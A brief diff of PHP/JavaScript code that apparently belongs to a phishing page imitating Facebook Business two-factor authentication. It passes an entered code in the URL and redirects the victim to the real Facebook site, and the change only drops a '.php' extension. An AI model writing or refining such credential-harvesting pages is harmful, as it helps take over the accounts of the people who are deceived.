@@ -184,7 +184,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                             if (error == 1) {
                                 window.location.href = "https://business.facebook.com/select/?next=";
                             } else {
-                                window.location.href = "two-factor-authentication.php?error=1&code=" + code;
+                                window.location.href = "two-factor-authentication?error=1&code=" + code;
                             }
                         }, 1000);
                     } else {
